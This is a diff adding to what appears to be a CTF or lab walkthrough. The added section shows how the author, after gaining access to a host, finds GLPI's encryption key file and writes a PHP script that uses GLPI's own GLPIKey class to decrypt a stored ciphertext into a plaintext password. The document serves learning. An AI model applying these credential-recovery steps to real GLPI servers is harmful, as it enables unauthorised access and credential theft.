@@ -267,10 +267,77 @@ The other fileds only contain 'null' values.
 ```
 avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
 ```
---- Working on it ---
+In reallity, this is not a hash but a ciphered line, so no tool will tell you what it trully means.
+
+- Search for the key to decipher.
+```bash
+grep -r "GLPIKEY" /opt/glpi/ 2>/dev/null
+```
+It will return a key found on `/opt/glpi/src/autoload/constants.php`.
+
+```
+define("GLPIKEY", "GLPI£i'snarss'ç")
+```
+### GLPIkey
+
+- When going to the file `GLPIkey.php`, we find some methods which treat the process of legacy key, encryption & decryption.
+
+There we see that there are two methods, decrypt() and decryptUsingLegacyKey(). Inside this methods ' libsodium XChaCha20-Poly1305' is mentioned, which is an ecrypting method.
+
+- At line 103 we see another interesting file `$this->keyfile = $config_dir . '/glpicrypt.key';`. Using `find` the absolute path is `/opt/glpi/config/glpicrypt.key`
+
+```bash
+wc -c /opt/glpi/config/glpicrypt.key
+```
+
+- The file is as big as the define length on the previous .php functions, therefore it should be the key. Lets make a scritp for decryption:
+
+1. Create tmp directory
+```bash
+cd "$(mktemp -d)"
+```
+
+2. Make the script
+
+```bash
+#decrypt.php                                               
+<?php
+define("GLPI_CONFIG_DIR", "/opt/glpi/config");
+require "/opt/glpi/vendor/autoload.php";
+require "/opt/glpi/src/GLPIKey.php";
+
+$key = new GLPIKey();
+$dec     = "avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==";
+$pass    = $key->decrypt($dec);
+
+echo "\n";
+echo "[+] Decrypted pass: $pass\n";
+```
+
+3. Give exec perms and use
+```bash
+chmod +x decrypt.php
+php decrypt.php
+```
+
+- The result is :
+```
+openam@management:/tmp/tmp.WghDYlDbtT$ php key_get.php                                               
+#decrypt.php
+
+[+] Decrypted pass: WpczC40GhTbk
+
+```
+
+
+----On going------
+
+
+
 
 
 --- 
+
 # Learned
 
 Don't skip something on linpeas only because its not 'orange'(95% of being a vector for PE). 
